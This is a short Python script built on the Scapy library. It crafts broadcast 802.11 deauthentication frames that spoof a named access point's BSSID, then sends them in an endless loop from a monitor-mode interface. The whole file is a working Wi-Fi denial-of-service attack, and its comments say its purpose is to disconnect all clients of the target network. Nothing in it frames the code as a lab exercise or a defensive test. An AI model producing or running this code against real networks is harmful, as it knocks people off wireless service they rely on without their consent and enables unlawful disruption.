from scapy.all import *

# Target AP MAC Address (BSSID)
target_bssid = "C8:84:CF:28:AD:90"

# Monitor mode interface
iface = "wlan0mon"

# Create a broadcast deauth packet (disconnects all clients)
deauth_packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()

print(f"Sending deauth packets to all clients on {target_bssid}...")

# Send packets continuously
while True:
    sendp(deauth_packet, iface=iface, count=10, inter=0.1, verbose=False)

